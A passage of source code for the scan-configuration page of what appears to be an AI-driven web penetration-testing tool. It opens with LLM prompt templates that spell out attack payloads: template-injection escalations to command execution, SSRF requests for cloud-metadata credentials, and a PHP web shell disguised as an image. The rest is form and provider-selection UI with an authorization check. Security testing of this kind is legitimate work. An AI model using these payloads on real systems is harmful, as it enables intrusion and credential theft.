      "6. Fat GET - send GET request with body; if server processes body but cache ignores it, poison with body injection\n" +
      "7. Path normalization - /en/../admin, /./admin; test if different representations bypass cache rules\n" +
      "8. Cookie-based cache poisoning - inject cache-buster via Set-Cookie reflected in response; probe for response splitting",
  },
  {
    id: "ssti",
    label: "SSTI (Template Injection)",
    icon: "🔧",
    category: "Advanced Techniques",
    description: "Server-Side Template Injection",
    prompt:
      "Test for Server-Side Template Injection (SSTI) across all template engines:\n" +
      "1. Detection polyglot - inject: ${{<%[%'\"}}%\\; if error reveals template engine type, proceed accordingly\n" +
      "2. Jinja2/Python - {{7*7}} → 49 confirms; escalate: {{config}}, {{request.environ}}, {{''.class.mro()[1].subclasses()[407]('id',shell=True,stdout=-1).communicate()}}\n" +
      "3. Twig/PHP - {{7*7}} → 49; escalate: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}\n" +
      "4. Freemarker/Java - ${7*7} → 49; escalate: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}\n" +
      "5. Velocity/Java - #set($x=7*7)${x} → 49; escalate: #set($rt=$class.forName('java.lang.Runtime'))#set($e=$rt.exec('id'))\n" +
      "6. Smarty/PHP - {7*7} → 49; escalate: {php}echo shell_exec('id');{/php}\n" +
      "7. Pebble/Java - {{7*7}} → 49; escalate: {% set cmd = 'id' %}{% set bytes = \"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(cmd) %}\n" +
      "8. Handlebars/Node - {{7*7}}; escalate: {{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}...\n" +
      "Inject in: error messages, email templates, PDF generators, user profile display names, search results",
  },

  // ── Infrastructure ───────────────────────────────────────────────────────────
  {
    id: "cloud_aws",
    label: "Cloud / AWS Metadata",
    icon: "☁️",
    category: "Infrastructure",
    description: "Cloud-hosted app, AWS/GCP/Azure",
    prompt:
      "Target is hosted in cloud infrastructure. Attack vectors:\n" +
      "1. IMDS abuse via SSRF - exploit SSRF to reach http://169.254.169.254/latest/meta-data/iam/security-credentials/{role-name}; steal IAM credentials\n" +
      "2. IMDSv1 vs IMDSv2 - test if IMDSv1 is enabled (no token required); if IMDSv2, attempt to forge PUT request to get token\n" +
      "3. S3 bucket misconfiguration - identify S3 bucket names from JS/HTML source; test for public read/write/list access\n" +
      "4. Environment variable leakage - trigger verbose errors or SSRF to /proc/self/environ to expose AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY\n" +
      "5. GCP metadata - http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token (requires Metadata-Flavor: Google header)\n" +
      "6. Azure IMDS - http://169.254.169.254/metadata/instance?api-version=2021-02-01 (requires Metadata: true header)\n" +
      "7. Lambda/serverless - check for exposed /dev, /staging, /prod routes; test Lambda function URL authentication\n" +
      "8. Container escape indicators - check if running in Docker (/.dockerenv exists); test Kubernetes metadata at 10.0.0.1/api",
  },
  {
    id: "information_disclosure",
    label: "Information Disclosure",
    icon: "🔍",
    category: "Infrastructure",
    description: "Sensitive data and endpoint exposure",
    prompt:
      "Comprehensive information disclosure reconnaissance:\n" +
      "1. Backup files - probe: index.php.bak, config.php~, database.sql, .DS_Store, Thumbs.db, web.config.bak, settings.py.bak\n" +
      "2. Version control exposure - check /.git/config, /.git/HEAD, /.svn/entries, /.hg/store - if exposed, dump entire repo with git-dumper\n" +
      "3. Debug/info endpoints - probe /phpinfo.php, /info.php, /status, /server-status, /server-info, /_status, /health, /_health\n" +
      "4. API documentation - check /api-docs, /swagger-ui.html, /openapi.json, /api/v1/docs, /redoc, /graphql (introspection)\n" +
      "5. Error message analysis - trigger 400/500 errors intentionally; extract framework version, DB type, file paths from stack traces\n" +
      "6. JavaScript source analysis - enumerate JS files; extract hardcoded API keys, credentials, internal endpoints, debug flags\n" +
      "7. HTTP security headers - check for missing: HSTS, X-Frame-Options, X-Content-Type-Options, CSP, Permissions-Policy\n" +
      "8. SSL/TLS misconfiguration - test for TLS 1.0/1.1 support, weak cipher suites, certificate transparency logs for subdomains\n" +
      "9. CORS misconfiguration - send Origin: https://evil.com; check if Access-Control-Allow-Origin reflects or is wildcard with credentials",
  },
  {
    id: "file_upload",
    label: "File Upload Bypass",
    icon: "📤",
    category: "Infrastructure",
    description: "Malicious file upload techniques",
    prompt:
      "Test file upload functionality for security controls bypass:\n" +
      "1. Extension bypass - upload shell.php.jpg, shell.php%00.jpg, shell.php5, shell.phtml, shell.pHp, shell.php:$DATA (Windows NTFS)\n" +
      "2. Content-Type bypass - change MIME type to image/jpeg while uploading .php file; test Content-Type: image/png with PHP content\n" +
      "3. Magic bytes bypass - prepend GIF89a; to PHP shell so it passes image validation: GIF89a;<?php system($_GET['cmd']); ?>\n" +
      "4. Archive extraction - upload zip with path traversal: ../../../var/www/html/shell.php inside zip\n" +
      "5. SVG upload XSS - upload SVG containing <script>alert(document.domain)</script> if SVG is rendered in-browser\n" +
      "6. XML-based uploads - DOCX/XLSX contain XML; modify to include XXE payloads before upload\n" +
      "7. Upload path disclosure - check if response reveals absolute path (/var/www/uploads/shell.php); access file directly\n" +
      "8. Double extension - web server may execute file.php.jpg if misconfigured for AddHandler application/x-httpd-php .php\n" +
      "9. ImageMagick exploit (ImageTragick CVE-2016-3714) - upload crafted ImageMagick policy bypass or MVG file for RCE",
  },
];

// ── Field wrapper ─────────────────────────────────────────────────────────────

// ── Field wrapper ─────────────────────────────────────────────────────────────

function Field({
  label, required, hint, tooltip, children,
}: {
  label: string;
  required?: boolean;
  hint?: string;
  tooltip?: string;
  children: React.ReactNode;
}) {
  const [open, setOpen] = useState(false);
  return (
    <div>
      <label className="block text-[13px] font-semibold text-gray-800 mb-0.5">
        <span className="inline-flex items-center gap-1.5">
          {label}{required && <span className="text-red-500 ml-0.5">*</span>}
          {tooltip && (
            <span className="relative inline-flex items-center">
              <button
                type="button"
                onMouseEnter={() => setOpen(true)}
                onMouseLeave={() => setOpen(false)}
                onClick={() => setOpen((v) => !v)}
                className="h-3.5 w-3.5 rounded-full bg-slate-200 hover:bg-slate-300 text-slate-500 dark:text-zinc-400 text-[9px] font-bold leading-none flex items-center justify-center shrink-0 transition-colors"
                aria-label="More info"
              >
                !
              </button>
              {open && (
                <div className="absolute left-5 top-0 z-50 w-72 bg-white dark:bg-zinc-900 border border-slate-200 dark:border-zinc-800 text-slate-700 dark:text-zinc-300 text-xs rounded-lg shadow-lg p-3 leading-relaxed whitespace-pre-line pointer-events-none">
                  <div className="font-semibold text-slate-800 dark:text-zinc-200 mb-1.5 border-b border-slate-200 dark:border-zinc-800 pb-1">{label}</div>
                  {tooltip}
                  <div className="absolute left-[-5px] top-2 w-0 h-0 border-y-4 border-y-transparent border-r-4 border-r-white" />
                  <div className="absolute left-[-6px] top-2 w-0 h-0 border-y-4 border-y-transparent border-r-4 border-r-slate-200" />
                </div>
              )}
            </span>
          )}
        </span>
      </label>
      {hint && <p className="text-[11px] text-slate-500 dark:text-zinc-400 mb-1 leading-snug">{hint}</p>}
      {!hint && <div className="mb-1" />}
      {children}
    </div>
  );
}

// ── Template picker modal ─────────────────────────────────────────────────────

function TemplatePicker({
  onSelect,
  onClose,
}: {
  onSelect: (prompt: string) => void;
  onClose: () => void;
}) {
  const [selected, setSelected] = useState<string | null>(null);
  const [activeCategory, setActiveCategory] = useState("All");
  const [search, setSearch] = useState("");

  const filtered = PROMPT_TEMPLATES.filter((t) => {
    const matchCat = activeCategory === "All" || t.category === activeCategory;
    const q = search.toLowerCase();
    const matchSearch = !q || t.label.toLowerCase().includes(q) || t.description.toLowerCase().includes(q);
    return matchCat && matchSearch;
  });

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 backdrop-blur-sm p-4">
      <div className="bg-white dark:bg-zinc-900 rounded-2xl shadow-2xl w-full max-w-4xl overflow-hidden flex flex-col max-h-[90vh]">
        {/* Header */}
        <div className="flex items-center justify-between px-6 py-4 border-b border-border shrink-0">
          <div className="flex items-center gap-2">
            <LayoutTemplate className="h-5 w-5 text-teal-700 dark:text-teal-400" />
            <h2 className="text-base font-semibold">Prompt Templates</h2>
            <span className="text-xs text-muted-foreground bg-slate-100 dark:bg-zinc-800 px-2 py-0.5 rounded-full">
              {filtered.length} / {PROMPT_TEMPLATES.length}
            </span>
          </div>
          <button onClick={onClose} className="text-muted-foreground hover:text-foreground">
            <X className="h-5 w-5" />
          </button>
        </div>

        {/* Search + category tabs */}
        <div className="px-5 pt-4 pb-3 border-b border-border bg-slate-100 dark:bg-zinc-800/40 shrink-0 space-y-3">
          {/* Search */}
          <input
            type="text"
            placeholder="Search templates…"
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            className="w-full text-sm border border-border rounded-lg px-3 py-1.5 focus:outline-none focus:ring-2 focus:ring-teal-400"
          />
          {/* Category tabs */}
          <div className="flex flex-wrap gap-1.5">
            {TEMPLATE_CATEGORIES.map((cat) => {
              const count = cat === "All"
                ? PROMPT_TEMPLATES.length
                : PROMPT_TEMPLATES.filter((t) => t.category === cat).length;
              return (
                <button
                  key={cat}
                  type="button"
                  onClick={() => setActiveCategory(cat)}
                  className={`px-2.5 py-1 rounded-full text-xs font-medium transition-colors ${
                    activeCategory === cat
                      ? "bg-teal-600 text-white"
                      : "bg-white dark:bg-zinc-900 border border-border text-muted-foreground hover:bg-accent"
                  }`}
                >
                  {cat}
                  <span className={`ml-1 ${activeCategory === cat ? "text-teal-100" : "text-muted-foreground/60"}`}>
                    ({count})
                  </span>
                </button>
              );
            })}
          </div>
        </div>

        {/* Template grid */}
        <div className="p-5 grid grid-cols-2 gap-3 overflow-y-auto flex-1">
          {filtered.length === 0 ? (
            <div className="col-span-2 py-12 text-center text-sm text-muted-foreground">
              No templates match your search.
            </div>
          ) : (
            filtered.map((t) => (
              <button
                key={t.id}
                type="button"
                onClick={() => setSelected(selected === t.id ? null : t.id)}
                className={`text-left p-4 rounded-xl border-2 transition-all ${
                  selected === t.id
                    ? "border-teal-500 bg-teal-50 dark:bg-teal-950/35"
                    : "border-border hover:border-teal-600/50 hover:bg-accent/30"
                }`}
              >
                <div className="flex items-start gap-3">
                  <span className="text-2xl leading-none mt-0.5 shrink-0">{t.icon}</span>
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2">
                      <p className="text-sm font-semibold text-slate-800 dark:text-zinc-100">{t.label}</p>
                      <span className="text-[10px] text-muted-foreground bg-slate-100 dark:bg-zinc-800 px-1.5 py-0.5 rounded-full shrink-0">
                        {t.category}
                      </span>
                    </div>
                    <p className="text-xs text-muted-foreground mt-0.5">{t.description}</p>
                    {selected === t.id && (
                      <p className="text-xs text-slate-700 dark:text-zinc-300 mt-2 leading-relaxed border-t border-teal-700/50 pt-2 whitespace-pre-line">
                        {t.prompt}
                      </p>
                    )}
                  </div>
                  {selected === t.id && (
                    <Check className="h-4 w-4 text-teal-700 dark:text-teal-400 shrink-0 mt-0.5" />
                  )}
                </div>
              </button>
            ))
          )}
        </div>

        {/* Footer */}
        <div className="flex items-center justify-between px-6 py-4 border-t border-border bg-slate-100 dark:bg-zinc-800/40 shrink-0">
          <p className="text-xs text-muted-foreground">
            {selected
              ? `Selected: ${PROMPT_TEMPLATES.find((t) => t.id === selected)?.label}`
              : "Click a template to preview, click again to deselect"}
          </p>
          <div className="flex gap-2">
            <button
              type="button"
              onClick={onClose}
              className="px-4 py-2 text-sm border border-border rounded-lg hover:bg-accent"
            >
              Cancel
            </button>
            <button
              type="button"
              disabled={!selected}
              onClick={() => {
                const t = PROMPT_TEMPLATES.find((t) => t.id === selected);
                if (t) onSelect(t.prompt);
                onClose();
              }}
              className="px-4 py-2 text-sm bg-teal-600 text-white rounded-lg hover:bg-teal-700 dark:hover:bg-teal-500 disabled:opacity-50"
            >
              Use Template
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

// ── Main page ─────────────────────────────────────────────────────────────────

export default function NewScanPage() {
  const navigate = useNavigate();
  const [form, setForm] = useState<ScanCreate>({
    target_url: "",
    scan_mode: "full",
    llm_provider: undefined,
    llm_model: "",
    max_hypotheses: 20,
    max_parallel: 3,
    feedback_iter: 2,
    exploit_hypo_timeout: 240,
    exploit_max_turns: 8,
    exploit_hypo_cap: 25,
    source_repo_url: "",
    token_budget: 200_000,
    turn_budget: 80,
    hitl_required: true,
    scope_deny: [],
  });
  // "web" = crawl/exploit a live URL; "source" = clone a repo and review the code.
  const [scanType, setScanType] = useState<"web" | "source">("web");
  const [showAdvanced, setShowAdvanced] = useState(false);
  const [showTemplatePicker, setShowTemplatePicker] = useState(false);
  const [authorized, setAuthorized] = useState(false);
  const [ollamaModels, setOllamaModels] = useState<string[]>([]);
  const [detecting, setDetecting] = useState(false);
  const [detectError, setDetectError] = useState("");

  // Fetch settings to read configured providers + models
  const { data: settings } = useQuery({
    queryKey: ["settings"],
    queryFn: () => api.get("/settings").then((r) => r.data),
  });

  // Build list of providers that have been configured in Settings
  type AdvancedParam = { label: string; value: string };
  type ProviderMeta = { key: string; label: string; model: string; configured: boolean; params: AdvancedParam[] };

  const _fmt = (v: number | null | undefined, decimals = 1) =>
    v != null ? v.toFixed(decimals) : null;

  const providerList: ProviderMeta[] = settings ? [
    {
      key: "anthropic",
      label: "Anthropic",
      model: settings.anthropic_default_model || "claude-sonnet-5",
      configured: !!settings.anthropic_key_set,
      params: [
        { label: "Temp", value: _fmt(settings.anthropic_temperature ?? 0.7) ?? "0.7" },
        ...(settings.anthropic_top_p != null ? [{ label: "Top-P", value: _fmt(settings.anthropic_top_p)! }] : []),
      ],
    },
    {
      key: "openai",
      label: "OpenAI",
      model: settings.openai_default_model || "gpt-5.1",
      configured: !!settings.openai_key_set,
      params: [
        { label: "Temp", value: _fmt(settings.openai_temperature ?? 0.7) ?? "0.7" },
        ...(settings.openai_top_p != null ? [{ label: "Top-P", value: _fmt(settings.openai_top_p)! }] : []),
        ...(settings.openai_frequency_penalty != null && settings.openai_frequency_penalty !== 0
          ? [{ label: "FreqP", value: _fmt(settings.openai_frequency_penalty)! }] : []),
        ...(settings.openai_presence_penalty != null && settings.openai_presence_penalty !== 0
          ? [{ label: "PresP", value: _fmt(settings.openai_presence_penalty)! }] : []),
      ],
    },
    {
      key: "openrouter",
      label: settings.openrouter_auth_method === "oauth" && settings.openrouter_key_set
        ? "OpenRouter (connected)"
        : "OpenRouter",
      model: settings.openrouter_default_model || "anthropic/claude-sonnet-5",
      configured: !!settings.openrouter_key_set,
      params: [
        { label: "Temp", value: _fmt(settings.openrouter_temperature ?? 0.7) ?? "0.7" },
        ...(settings.openrouter_top_p != null ? [{ label: "Top-P", value: _fmt(settings.openrouter_top_p)! }] : []),
      ],
    },
    {
      key: "ollama",
      // A local server needs no credentials, the hosted service does : the card
      // used to claim "configured" unconditionally, so a cloud setup with no key
      // looked ready and only failed once the scan had started.
      label: settings.ollama_mode === "cloud" ? "Ollama Cloud" : "Ollama",
      model: settings.ollama_default_model || "",
      configured: settings.ollama_mode === "cloud" ? !!settings.ollama_key_set : true,
      params: [
        { label: "Temp", value: _fmt(settings.ollama_temperature ?? 0.1) ?? "0.1" },
        ...(settings.ollama_top_p != null ? [{ label: "Top-P", value: _fmt(settings.ollama_top_p)! }] : []),
        ...(settings.ollama_top_k != null ? [{ label: "Top-K", value: String(settings.ollama_top_k) }] : []),
        ...(settings.ollama_repeat_penalty != null ? [{ label: "RepPen", value: _fmt(settings.ollama_repeat_penalty)! }] : []),
      ],
    },
    {
      key: "mistral",
      label: "Mistral",
      model: settings.mistral_default_model || "mistral-large-latest",
      configured: !!settings.mistral_key_set,
      params: [
        { label: "Temp", value: _fmt(settings.mistral_temperature ?? 0.7) ?? "0.7" },
        ...(settings.mistral_top_p != null ? [{ label: "Top-P", value: _fmt(settings.mistral_top_p)! }] : []),
      ],
    },
    {
      key: "groq",
      label: "Groq",
      model: settings.groq_default_model || "llama-3.3-70b-versatile",
      configured: !!settings.groq_key_set,
      params: [
        { label: "Temp", value: _fmt(settings.groq_temperature ?? 0.7) ?? "0.7" },
        ...(settings.groq_top_p != null ? [{ label: "Top-P", value: _fmt(settings.groq_top_p)! }] : []),
      ],
    },
    {
      key: "xai",
      label: "xAI (Grok)",
      model: settings.xai_default_model || "grok-4.6",
      configured: !!settings.xai_key_set,
      params: [
        { label: "Temp", value: _fmt(settings.xai_temperature ?? 0.7) ?? "0.7" },
        ...(settings.xai_top_p != null ? [{ label: "Top-P", value: _fmt(settings.xai_top_p)! }] : []),
      ],
    },
    {
      key: "deepseek",
      label: "DeepSeek",
      model: settings.deepseek_default_model || "deepseek-chat",
      configured: !!settings.deepseek_key_set,
      params: [
        { label: "Temp", value: _fmt(settings.deepseek_temperature ?? 0.7) ?? "0.7" },
        ...(settings.deepseek_top_p != null ? [{ label: "Top-P", value: _fmt(settings.deepseek_top_p)! }] : []),
      ],
    },
    {
      key: "zai",
      label: "Z.AI (GLM)",
      model: settings.zai_default_model || "glm-4.7",
      configured: !!settings.zai_key_set,
      params: [
        { label: "Temp", value: _fmt(settings.zai_temperature ?? 0.7) ?? "0.7" },
        ...(settings.zai_top_p != null ? [{ label: "Top-P", value: _fmt(settings.zai_top_p)! }] : []),
      ],
    },
    {
      key: "kimi",
      label: "Kimi (Moonshot)",
      model: settings.kimi_default_model || "kimi-latest",
      configured: !!settings.kimi_key_set,
      params: [
        { label: "Temp", value: _fmt(settings.kimi_temperature ?? 0.7) ?? "0.7" },
        ...(settings.kimi_top_p != null ? [{ label: "Top-P", value: _fmt(settings.kimi_top_p)! }] : []),
      ],
    },
  ] : [];

  // The chosen provider must actually have credentials. Without this the form
  // happily submits, the backend queues the scan, and it dies at engine init.
  const providerReady =
    !!form.llm_provider &&
    !!providerList.find(p => p.key === form.llm_provider)?.configured;

  const ollamaBaseUrl: string = settings?.ollama_base_url || "http://localhost:11434";

  const mutation = useMutation({
    mutationFn: scansApi.create,
    onSuccess: (scan) => navigate(`/scans/${scan.id}`),
  });

  const detectOllama = async () => {
    setDetecting(true);
    setDetectError("");
    try {
      const res = await api.post("/settings/detect-ollama-models", { base_url: ollamaBaseUrl });
      const models: string[] = res.data;
      setOllamaModels(models);
      if (models.length === 0) setDetectError(`No models found at ${ollamaBaseUrl}`);
      else if (models.length === 1) set("llm_model", models[0]);
    } catch {
      setOllamaModels([]);
      setDetectError(`Cannot reach Ollama at ${ollamaBaseUrl}. Check Settings → Ollama.`);
    } finally {
      setDetecting(false);
    }
  };

  const set = (k: keyof ScanCreate, v: any) => setForm((f) => ({ ...f, [k]: v }));

  const selectProvider = (p: ProviderMeta) => {
    set("llm_provider", p.key);
    set("llm_model", p.key === "ollama" ? "" : p.model);
    setOllamaModels([]);
    setDetectError("");
  };

  // ── Client-side validation (there is no <form>, so HTML5 constraint
  //    validation never fires : validate the active field ourselves). ──────────
  const trimmedTarget = (form.target_url || "").trim();
  const trimmedRepo = (form.source_repo_url || "").trim();

  const validationError: string | null = (() => {
    if (scanType === "web") {
      if (!trimmedTarget) return null; // emptiness handled by the disabled state
      let u: URL;
      try { u = new URL(trimmedTarget); }
      catch { return "Enter a valid URL, e.g. https://target.example.com"; }
      if (u.protocol !== "http:" && u.protocol !== "https:")
        return "Target URL must start with http:// or https://";
      return null;
    }
    // source code review
    if (!trimmedRepo) return null;
    let u: URL;
    try { u = new URL(trimmedRepo); }
    catch { return "Enter a valid repository URL, e.g. https://github.com/owner/repo"; }
    if (u.protocol !== "https:") return "Repository URL must use https://";
    const host = u.hostname.toLowerCase();
    if (host !== "github.com" && host !== "gitlab.com")
      return "Only public github.com or gitlab.com repositories are supported";
    if (u.pathname.replace(/^\/+|\/+$/g, "").split("/").filter(Boolean).length < 2)
      return "Include the owner and repository, e.g. https://github.com/owner/repo";
    return null;
  })();

  const canSubmit =
    (scanType === "web" ? !!trimmedTarget : !!trimmedRepo) &&
    !validationError && authorized && providerReady && !mutation.isPending;

  const submit = () => {
    if (!canSubmit) return;
    mutation.mutate({
      ...form,
      target_url: scanType === "web" ? trimmedTarget : "",
      source_repo_url: scanType === "source" ? trimmedRepo : "",
    });
  };

  return (
    <div className="max-w-3xl mx-auto">
      {showTemplatePicker && (
        <TemplatePicker
          onSelect={(prompt) => {
            set("custom_prompt", (form.custom_prompt ? form.custom_prompt + "\n\n" : "") + prompt);
          }}
          onClose={() => setShowTemplatePicker(false)}
        />
      )}

      <div className="mb-6">
        <h1 className="text-2xl font-bold text-slate-800 dark:text-zinc-100">New Scan</h1>
        <p className="text-sm text-slate-500 dark:text-zinc-400 mt-1">Configure and launch an AI-driven web penetration test</p>
      </div>

      <div className="bg-white dark:bg-zinc-900 border border-border rounded-xl p-4 space-y-3.5">

        {/* ── Scan Type: Web App vs Source Code Review ───────────────────── */}
        <Field
          label="Scan Type"
          hint="Web App: crawl and actively test a live URL. Source Code Review: clone a GitHub/GitLab repo and analyse the code (static + AI)."
        >
          <div className="flex gap-3">
            {([
              { k: "web", label: "Web App", desc: "Live URL - crawl + exploit" },
              { k: "source", label: "Source Code Review", desc: "GitHub/GitLab repo - code analysis" },
            ] as const).map((t) => (
              <button
                key={t.k}
                type="button"
                onClick={() => {
                  setScanType(t.k);
                  // Clear the other mode's field so a stale value never leaks into
                  // the submit : the backend infers scan type from source_repo_url.
                  if (t.k === "web") set("source_repo_url", "");
                  else set("target_url", "");
                }}
                className={`flex-1 py-2.5 px-3 text-sm rounded-lg border text-left transition-colors ${
                  scanType === t.k ? "bg-teal-600 text-white border-teal-600" : "border-border hover:bg-accent"
                }`}
              >
                <span className="font-semibold block">{t.label}</span>
                <span className={`text-[11px] ${scanType === t.k ? "text-teal-100" : "text-muted-foreground"}`}>{t.desc}</span>
              </button>
            ))}
          </div>
        </Field>

        {scanType === "web" ? (
          /* ── Target URL (web) ─────────────────────────────────────────── */
          <Field
            label="Target URL"
            required
            hint="The full base URL of the web application to scan. Must be reachable from this server."
            tooltip={"Enter the root URL of the target application (e.g. https://app.example.com).\n\n• Must include protocol (https:// or http://)\n• The scanner will crawl from this base URL and discover endpoints automatically\n• Ensure the target is reachable from this server's network\n• Do NOT include specific paths - use the root URL only\n\nExample: https://target.example.com"}
          >
            <input
              type="url"
              value={form.target_url}
              onChange={(e) => set("target_url", e.target.value)}
              onKeyDown={(e) => { if (e.key === "Enter") submit(); }}
              required
              placeholder="https://target.example.com"
              className="input"
            />
            {scanType === "web" && validationError && (
              <p className="text-[11px] text-red-600 dark:text-red-400 mt-1">{validationError}</p>
            )}
          </Field>
        ) : (
          /* ── Repository URL (source code review) ──────────────────────── */
          <Field
            label="Repository URL"
            required
            hint="Public GitHub or GitLab repository. The backend shallow-clones it and reviews the source code."
            tooltip={"Paste a PUBLIC repository URL from github.com or gitlab.com.\n\n• Must be https://\n• Only public repos are supported (no auth token yet)\n• The repo is shallow-cloned (--depth 1) into a temporary workspace\n• Static (regex OWASP) + AI analysis runs over the code - no live crawling\n\nExample: https://github.com/owner/repo"}
          >
            <input
              type="url"
              value={form.source_repo_url || ""}
              onChange={(e) => set("source_repo_url", e.target.value)}
              onKeyDown={(e) => { if (e.key === "Enter") submit(); }}
              required
              placeholder="https://github.com/owner/repo"
              className="input"
            />
            {scanType === "source" && validationError && (
              <p className="text-[11px] text-red-600 dark:text-red-400 mt-1">{validationError}</p>
            )}
          </Field>
        )}

        {/* ── Target Description ─────────────────────────────────────────── */}
        <Field
          label="Target Description"
          hint="Brief description of the target application - technology stack, purpose, or scope notes."
          tooltip={"Optional but highly recommended. Helps the AI understand the context and generate more relevant attack hypotheses.\n\nUseful details to include:\n• Backend technology (PHP/Laravel, Python/Django, Node.js, ASP.NET)\n• Database type (MySQL, PostgreSQL, MSSQL, MongoDB)\n• Frontend framework (React, Angular, Vue)\n• Application type (e-commerce, banking, CMS, API)\n• Known paths or admin areas\n• Authentication method (JWT, session, OAuth)\n\nExample: \"Laravel 10 e-commerce app with MySQL. Admin at /dashboard. JWT auth.\""}
        >
          <input
            type="text"
            value={form.target_description || ""}
            onChange={(e) => set("target_description", e.target.value || undefined)}
            placeholder="e.g. ASP.NET e-commerce site running on IIS, MySQL backend"
            className="input"
          />
        </Field>

        {/* ── Scan Mode (web only : a source review is always static+AI) ──── */}
        {scanType === "web" && (
        <Field
          label="Scan Mode"
          hint="Full Scan: active crawling + vulnerability testing + exploitation. Static Only: header and source code analysis without sending attack payloads."
          tooltip={"Choose how aggressively the scanner interacts with the target:\n\n🔴 Full Scan\n• Crawls all discovered pages and endpoints\n• Sends active attack payloads (SQLi, XSS, IDOR, etc.)\n• Uses a real browser (Playwright/Chromium) to detect JS-rendered content\n• Intercepts network requests to find hidden API calls\n• Tests and attempts to confirm each vulnerability\n• Duration: 5-30 minutes depending on application size\n\n🟡 Static Only\n• Analyzes response headers (CSP, HSTS, X-Frame-Options)\n• Checks for version disclosure and security misconfigurations\n• Does NOT send attack payloads - safe for production\n• Duration: 1-3 minutes\n\nRecommendation: Use Full Scan for authorized penetration tests."}
        >
          <div className="flex gap-3">
            {(["full", "static_only"] as const).map((m) => (
              <button
                key={m}
                type="button"
                onClick={() => set("scan_mode", m)}
                className={`flex-1 py-2 text-sm rounded-lg border transition-colors ${
                  form.scan_mode === m
                    ? "bg-teal-600 text-white border-teal-600"
                    : "border-border hover:bg-accent"
                }`}
              >
                {m === "full" ? "Full Scan" : "Static Only"}
              </button>
            ))}
          </div>
        </Field>
        )}

        {/* ── LLM Provider ───────────────────────────────────────────────── */}
        <Field
          label="LLM Provider"
          hint="Select the AI provider to use for this scan. Only providers configured in Settings are shown. Configure API keys in Settings → LLM Providers."
          tooltip={"The AI model that drives all scanning decisions - recon analysis, vulnerability hypothesis generation, and exploit attempts.\n\nAvailable providers:\n\n• Anthropic (Claude) - strongest reasoning\n• OpenAI / OpenRouter - GPT + aggregator\n• DeepSeek - deepseek-chat / reasoner\n• Z.AI (GLM) - glm-4.7 / glm-5.x via api.z.ai\n• Mistral, Groq, xAI, Kimi - OpenAI-compatible cloud\n• Ollama - fully offline local models\n\nConfigure API keys in Settings → LLM Providers before scanning."}
        >
          {providerList.length === 0 ? (
            <p className="text-xs text-muted-foreground italic">Loading provider list…</p>
          ) : (
            <div className="grid grid-cols-2 gap-2">
              {providerList.map((p) => {
                const isSelected = form.llm_provider === p.key;
                const isUnconfigured = !p.configured;
                return (
                  <button
                    key={p.key}
                    type="button"
                    disabled={isUnconfigured}
                    onClick={() => selectProvider(p)}
                    className={`relative flex flex-col items-start gap-1 px-3 py-2.5 rounded-lg border text-left transition-colors
                      ${isSelected ? "bg-teal-600 text-white border-teal-600" : ""}
                      ${!isSelected && !isUnconfigured ? "border-border hover:bg-accent" : ""}
                      ${isUnconfigured ? "border-border opacity-40 cursor-not-allowed" : ""}
                    `}
                  >
                    {/* Provider name + status dot */}
                    <div className="flex items-center gap-1.5 pr-4 w-full">
                      <span className="text-sm font-medium">{p.label}</span>
                      {!isUnconfigured && (
                        <span className={`h-1.5 w-1.5 rounded-full shrink-0 ${isSelected ? "bg-teal-200" : "bg-green-500"}`} />
                      )}
                    </div>

                    {/* Model name */}
                    <span className={`text-[11px] truncate max-w-full leading-tight ${isSelected ? "text-teal-100" : "text-muted-foreground"}`}>
                      {isUnconfigured ? "Not configured" : p.model || (p.key === "ollama" ? "Auto-detect" : "No model set")}
                    </span>

                    {/* Advanced params chips */}
                    {!isUnconfigured && p.params.length > 0 && (
                      <div className="flex flex-wrap gap-1 mt-0.5">
                        {p.params.map((param) => (
                          <span
                            key={param.label}
                            className={`inline-flex items-center gap-0.5 text-[9px] font-mono px-1.5 py-0.5 rounded-sm leading-none
                              ${isSelected
                                ? "bg-teal-500/60 text-teal-100"
                                : "bg-slate-100 dark:bg-zinc-800 text-slate-500 dark:text-zinc-400 border border-slate-200 dark:border-zinc-800"
                              }`}
                          >
                            <span className={`font-semibold ${isSelected ? "text-teal-200" : "text-slate-500 dark:text-zinc-400"}`}>{param.label}</span>
                            <span>{param.value}</span>
                          </span>
                        ))}
                      </div>
                    )}
                  </button>
                );
              })}
            </div>
          )}
          {!form.llm_provider && providerList.some(p => p.configured) && (
            <p className="text-xs text-amber-600 mt-1.5 flex items-center gap-1">
              <Info className="h-3 w-3 shrink-0" /> Please select a provider above.
            </p>
          )}
          {providerList.length > 0 && !providerList.some(p => p.configured && p.key !== "ollama") && (
            <p className="text-xs text-amber-600 mt-1.5 flex items-center gap-1">
              <Info className="h-3 w-3 shrink-0" /> No API keys configured. Go to Settings → LLM Providers to add a provider.
            </p>
          )}
        </Field>

        {/* ── Model : shown below provider card, editable ──────────────────── */}
        {form.llm_provider && (
          form.llm_provider === "ollama" ? (
            <Field
              label="Ollama Model"
              hint={`Uses Ollama at ${ollamaBaseUrl}. Click Auto-detect to list available models, or type a model name manually.`}
            >
              <div className="flex gap-2">
                <button type="button" onClick={detectOllama} disabled={detecting}
                  className="text-sm px-3 py-2 rounded-lg border border-border hover:bg-accent flex items-center gap-1.5 shrink-0">
                  {detecting ? <Loader2 className="h-3.5 w-3.5 animate-spin" /> : null}
                  Auto-detect
                </button>
                {ollamaModels.length > 0 ? (
                  <select value={form.llm_model || ""} onChange={(e) => set("llm_model", e.target.value)} className="input flex-1">
                    <option value="">Select model…</option>
                    {ollamaModels.map((m) => <option key={m} value={m}>{m}</option>)}
                  </select>
                ) : (
                  <input type="text" value={form.llm_model || ""} onChange={(e) => set("llm_model", e.target.value)}
                    placeholder={settings?.ollama_default_model || "e.g. llama3.2:latest"} className="input flex-1" />
                )}
              </div>
              {detectError && (
                <p className="text-xs text-red-500 mt-1.5 flex items-center gap-1">
                  <Info className="h-3 w-3 shrink-0" /> {detectError}
                </p>
              )}
              {ollamaModels.length > 0 && (
